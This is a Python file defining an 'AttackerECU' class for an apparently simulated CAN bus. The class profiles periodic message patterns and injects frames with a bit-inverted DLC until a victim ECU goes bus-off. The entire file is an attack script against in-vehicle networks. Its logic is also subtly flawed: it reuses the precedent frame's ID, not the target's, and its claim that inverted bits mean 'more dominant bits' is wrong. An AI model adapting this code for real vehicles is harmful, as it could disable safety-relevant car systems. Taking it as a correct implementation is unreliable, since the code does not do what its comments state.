import time
from ecu import ECU

class AttackerECU(ECU):
    def __init__(self, name, bus):
        super().__init__(name, bus)
        self.observed_patterns = {}  # Tracks periodic messages and precedents
        self.target_pattern = None  # Stores identified target pattern (if found)
        self.target_identified = False  # Prevent redundant logging

    def analyze_pattern(self, frames):
        """Analyze bus traffic to identify periodic patterns."""
        total_appearances = {}  # Track total appearances of each message ID

        for i in range(1, len(frames)):
            precedent = frames[i - 1]["id"]
            current_id = frames[i]["id"]

            # Update total appearance count
            total_appearances[current_id] = total_appearances.get(current_id, 0) + 1

            # Update precedents for current_id
            if current_id not in self.observed_patterns:
                self.observed_patterns[current_id] = {}

            if precedent not in self.observed_patterns[current_id]:
                self.observed_patterns[current_id][precedent] = 0

            self.observed_patterns[current_id][precedent] += 1

        # Identify the target pattern
        best_target = None
        max_appearance = 0

        for current_id, precedents in self.observed_patterns.items():
            total_count = total_appearances[current_id]
            most_common_precedent = max(precedents, key=precedents.get, default=None)
            precedent_count = precedents.get(most_common_precedent, 0)

            # A valid target requires a high appearance count and consistent precedent
            if total_count > max_appearance and precedent_count > 1:
                max_appearance = total_count
                best_target = (current_id, most_common_precedent)

        if best_target and not self.target_identified:
            self.target_pattern = best_target
            self.target_identified = True  # Prevent redundant logging
            print(f"[{self.name}] Target pattern identified: Periodic ID {best_target[0]}, Preceded by {best_target[1]}")

    def fabricate_dlc(self, target_dlc):
        """Generate a fabricated DLC with more dominant bits than the target DLC."""
        fabricated_dlc = ''.join('0' if bit == '1' else '1' for bit in target_dlc)
        return fabricated_dlc

    def execute_attack(self, victim):
        """Launch the attack based on identified pattern."""
        if not self.target_pattern:
            print(f"[{self.name}] No pattern identified, no attack launched.")
            return

        periodic_id, precedent_id = self.target_pattern
        while not victim.is_bus_off:
            frame = self.bus.receive_frame()
            if frame and frame["id"] == precedent_id:
                time.sleep(0.01)  # Simulate the delay after precedent message

                # Generate fabricated DLC based on the victim's DLC
                target_dlc = frame.get("dlc", "0000")
                fabricated_dlc = self.fabricate_dlc(target_dlc)

                fabricated_frame = {
                    "id": frame["id"],  # Keep the same ID
                    "data": frame["data"],  # Keep the same payload
                    "dlc": fabricated_dlc  # Modify the DLC
                }
                self.send(fabricated_frame)
                print(f"[{self.name}] Injected fabricated frame: {fabricated_frame}")
